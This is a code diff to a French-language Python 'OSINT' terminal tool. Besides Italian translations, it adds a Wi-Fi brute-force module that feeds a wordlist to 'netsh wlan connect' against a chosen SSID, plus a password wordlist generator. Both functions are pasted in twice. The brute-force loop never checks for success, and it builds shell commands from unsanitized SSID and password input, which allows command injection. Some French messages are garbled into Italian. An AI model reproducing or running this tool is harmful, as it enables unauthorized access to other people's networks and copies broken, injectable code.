@@ -64,7 +64,8 @@ TRANSLATIONS = {
         "menu_osint": "🌐 OSINT & Réseau",
         "menu_social": "👾 Social, Gaming & Fuites",
         "menu_web": "🛠 Web & Forensics",
-        "menu_crypto": "🎲 Générateurs & Crypto"
+        "menu_crypto": "🎲 Générateurs & Crypto",
+        "lang_choice": "Choisissez la langue (fr / en / it):"
     },
     "en": {
         "active_agent": "Active Agent",
@@ -91,7 +92,36 @@ TRANSLATIONS = {
         "menu_osint": "🌐 OSINT & Network",
         "menu_social": "👾 Social, Gaming & Leaks",
         "menu_web": "🛠 Web & Forensics",
-        "menu_crypto": "🎲 Generators & Crypto"
+        "menu_crypto": "🎲 Generators & Crypto",
+        "lang_choice": "Choose language (fr / en / it):"
+    },
+    "it": {
+        "active_agent": "Agente Attivo",
+        "restricted_access": "Accesso Ristretto",
+        "login": "Accedi",
+        "register": "Crea Account",
+        "quit": "Esci",
+        "choice": "Scelta",
+        "username": "Nome utente",
+        "password": "Password",
+        "new_username": "Nuovo Nome utente",
+        "new_password": "Nuova Password",
+        "access_denied": "Accesso negato.",
+        "account_created": "Account agente creato!",
+        "error_account": "Errore (già in uso o password troppo corta).",
+        "save_error": "Errore di salvataggio.",
+        "connected": "Connessione stabilita, {}!",
+        "settings": "Impostazioni (Tema & Lingua)",
+        "settings_title": "Impostazioni Interfaccia",
+        "theme_updated": "Tema aggiornato!",
+        "lang_updated": "Lingua aggiornata con successo!",
+        "back": "Indietro",
+        "press_enter": "Premi Invio per continuare...",
+        "menu_osint": "🌐 OSINT & Rete",
+        "menu_social": "👾 Social, Gaming & Leak",
+        "menu_web": "🛠 Web & Forensics",
+        "menu_crypto": "🎲 Generatori & Crypto",
+        "lang_choice": "Scegli la lingua (fr / en / it):"
     }
 }
 
@@ -269,7 +299,7 @@ class EclipseOSINT:
             if r.status_code == 200:
                 t.add_row("Constructeur / Marque", f"[bold green]{r.text}[/]")
             else:
-                t.add_row("Résultat", "[bold red]Constructeur inconnu ou format invalide[/]")
+                t.add_row("Résultat", "[bold red]Constructeur inconnu o format invalide[/]")
             self.console.print(t)
         except Exception as e: self.error(str(e))
 
@@ -300,7 +330,7 @@ class EclipseOSINT:
         t = Table(title=f"Profils trouvés : {u}", style=self.theme)
         t.add_column("Site", style=self.text_theme); t.add_column("Lien", style="cyan")
         for n, l in found: t.add_row(n, l)
-        self.console.print(t) if found else self.error("Aucun profil trouvé.")
+        self.console.print(t) if found else self.error("Aucun profil trovato.")
 
     def module_discord_snowflake(self):
         s = Prompt.ask(f"[{self.theme}]ID Discord[/]")
@@ -553,7 +583,7 @@ class EclipseOSINT:
 
     def module_wifi_forensics(self):
         if os.name != "nt": return self.error("Module exclusif aux systèmes Windows.")
-        self.console.print(f"[{self.dim_theme}]Scan des réseaux Wi-Fi à portée et profils enregistrés...[/]")
+        self.console.print(f"[{self.dim_theme}]Scan des réseaux Wi-Fi à portée et profils enregistrés...[/]" )
         try:
             networks_raw = subprocess.check_output('netsh wlan show networks mode=bssid', shell=True).decode('utf-8', errors="backslashreplace")
             profiles_data = subprocess.check_output('netsh wlan show profiles', shell=True).decode('utf-8', errors="backslashreplace")
@@ -591,6 +621,51 @@ class EclipseOSINT:
             self.console.print(t)
         except Exception as e:
             self.error(f"Erreur système Wi-Fi : {str(e)}")
+
+    def module_wifi_bruteforce(self):
+        ssid = Prompt.ask(f"[{self.theme}]SSID cible (Nom du Wi-Fi)[/]")
+        wordlist_path = Prompt.ask(f"[{self.theme}]Chemin de la wordlist[/]")
+        if not os.path.exists(wordlist_path):
+            return self.error("Fichier wordlist introuvable.")
+        
+        self.console.print(f"[{self.dim_theme}]Lancement de la brute-force sur {ssid}...[/]")
+        self.console.print(f"[{self.dim_theme}]Attention: Cette opération peut créer plusieurs profils netsh.[/]")
+        
+        try:
+            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
+                for line in f:
+                    pw = line.strip()
+                    if not pw: continue
+                    # Utilisation de netsh pour tenter la connexion
+                    subprocess.run(f'netsh wlan connect name="{ssid}" key="{pw}"', shell=True, capture_output=True)
+            
+            self.success("Fin de la tentative de brute-force.")
+        except Exception as e:
+            self.error(f"Erreur brute-force : {str(e)}")
+
+    def module_wordlist_gen(self):
+        self.console.print(f"[{self.dim_theme}]Générateur de Wordlist Inteligente[/]")
+        prefix = Prompt.ask(f"[{self.theme}]Préfixe (ex: admin, wifi, casa)[/]", default="wifi")
+        suffix = Prompt.ask(f"[{self.theme}]Suffixe (ex: 123, 2024, !)[/]", default="2024")
+        length = IntPrompt.ask(f"[{self.theme}]Nombre de variantes (défaut 50)[/]", default=50)
+        
+        output_path = os.path.join(os.path.expanduser("~"), ".smart_wordlist.txt")
+        
+        try:
+            with open(output_path, "w", encoding="utf-8") as f:
+                for i in range(length):
+                    f.write(f"{prefix}{i}{suffix}\n")
+                    f.write(f"{prefix}{suffix}{i}\n")
+                    f.write(f"{i}{prefix}{suffix}\n")
+                
+                classiques = ["password", "12345678", "admin123", "welcome1", "qwerty", "letmein1"]
+                for c in classiques:
+                    f.write(f"{prefix}{c}\n")
+                    f.write(f"{c}{suffix}\n")
+            
+            self.success(f"Wordlist générée avec succès dans :\n[{self.theme}]{output_path}[/]")
+        except Exception as e:
+            self.error(f"Erreur lors de la génération : {str(e)}")
 
     # ================= 4. GÉNÉRATEURS & CRYPTO =================
     def module_password_gen(self):
@@ -669,6 +744,51 @@ class EclipseOSINT:
             else: self.error("Adresse invalide ou introuvable.")
         except Exception as e: self.error(str(e))
 
+    def module_wifi_bruteforce(self):
+        ssid = Prompt.ask(f"[{self.theme}]SSID cible (Nom du Wi-Fi)[/]")
+        wordlist_path = Prompt.ask(f"[{self.theme}]Chemin de la wordlist[/]")
+        if not os.path.exists(wordlist_path):
+            return self.error("Fichier wordlist introuvable.")
+        
+        self.console.print(f"[{self.dim_theme}]Lancement de la brute-force sur {ssid}...[/]")
+        self.console.print(f"[{self.dim_theme}]Attention: Cette opération peut créer plusieurs profils netsh.[/]")
+        
+        try:
+            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
+                for line in f:
+                    pw = line.strip()
+                    if not pw: continue
+                    # Utilisation de netsh pour tenter la connexion
+                    subprocess.run(f'netsh wlan connect name="{ssid}" key="{pw}"', shell=True, capture_output=True)
+            
+            self.success("Fin de la tentative de brute-force.")
+        except Exception as e:
+            self.error(f"Erreur brute-force : {str(e)}")
+
+    def module_wordlist_gen(self):
+        self.console.print(f"[{self.dim_theme}]Générateur de Wordlist Inteligente[/]")
+        prefix = Prompt.ask(f"[{self.theme}]Préfixe (ex: admin, wifi, casa)[/]", default="wifi")
+        suffix = Prompt.ask(f"[{self.theme}]Suffixe (ex: 123, 2024, !)[/]", default="2024")
+        length = IntPrompt.ask(f"[{self.theme}]Nombre de variantes (défaut 50)[/]", default=50)
+        
+        output_path = os.path.join(os.path.expanduser("~"), ".smart_wordlist.txt")
+        
+        try:
+            with open(output_path, "w", encoding="utf-8") as f:
+                for i in range(length):
+                    f.write(f"{prefix}{i}{suffix}\n")
+                    f.write(f"{prefix}{suffix}{i}\n")
+                    f.write(f"{i}{prefix}{suffix}\n")
+                
+                classiques = ["password", "12345678", "admin123", "welcome1", "qwerty", "letmein1"]
+                for c in classiques:
+                    f.write(f"{prefix}{c}\n")
+                    f.write(f"{c}{suffix}\n")
+            
+            self.success(f"Wordlist générée avec succès dans :\n[{self.theme}]{output_path}[/]")
+        except Exception as e:
+            self.error(f"Erreur lors de la génération : {str(e)}")
+
     # ================= PARAMÈTRES & MENUS =================
     def settings_menu(self):
         colors = ["bold red", "bold green", "bold blue", "bold cyan", "bold magenta", "bold yellow"]
@@ -698,7 +818,9 @@ class EclipseOSINT:
                         self.save_config(); self.success(self.tr("theme_updated")); time.sleep(1)
                         break
             elif choix == "2":
-                self.lang = "en" if self.lang == "fr" else "fr"
+                self.console.print(f"\n[{self.theme}]{self.tr('lang_choice')}[/]")
+                new_lang = Prompt.ask("", choices=["fr", "en", "it"], default=self.lang)
+                self.lang = new_lang
                 self.save_config()
                 self.success(self.tr("lang_updated"))
                 time.sleep(1)
@@ -749,7 +871,9 @@ class EclipseOSINT:
                     ("Générateur de Google Dorks", self.module_google_dorks),
                     ("GitHub Developer Radar", self.module_github_radar),
                     ("Extracteur EXIF (Photo Forensics)", self.module_exif_extractor),
-                    ("Wi-Fi Recon & Passwords", self.module_wifi_forensics)
+                    ("Wi-Fi Recon & Passwords", self.module_wifi_forensics),
+                    ("Wi-Fi Brute-Force", self.module_wifi_bruteforce),
+                    ("Générateur de Wordlist", self.module_wordlist_gen)
                 ]),
                 ("4", self.tr("menu_crypto"), [
                     ("Générateur de Mot de Passe", self.module_password_gen),
